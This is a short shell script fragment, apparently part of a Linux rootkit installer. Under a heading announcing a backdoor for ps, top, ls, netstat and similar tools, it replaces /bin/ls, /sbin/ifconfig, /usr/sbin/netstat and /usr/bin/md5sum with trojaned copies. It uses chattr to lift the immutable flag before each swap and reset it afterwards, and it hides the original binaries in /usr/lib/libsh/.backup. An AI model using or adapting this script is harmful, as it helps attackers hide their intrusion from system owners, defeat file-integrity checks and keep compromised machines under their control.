# Backdoor ps/top/du/ls/netstat/etc..

cd $BASEDIR/bin

BACKUP=/usr/lib/libsh/.backup
mkdir $BACKUP

# ls ...

if [ -f /bin/ls ]; then
chattr -isa /bin/ls
cp /bin/ls $BACKUP
mv -f ./ls /bin/ls
chattr +isa /bin/ls
fi

# ifconfig ...
chattr -isa /sbin/ifconfig
cp /sbin/ifconfig $BACKUP
mv -f ./ifconfig /sbin/ifconfig
chattr +isa /sbin/ifconfig

# netstat ...
if [ -f /usr/sbin/netstat ]; then
chattr -isa /usr/sbin/netstat
mv -f ./netstat /usr/sbin/netstat
chattr +isa /usr/sbin/netstat
fi

# md5sum ...
chattr -isa /usr/bin/md5sum
cp /usr/bin/md5sum $BACKUP
mv -f ./md5sum /usr/bin/md5sum
chattr +isa /usr/bin/md5sum
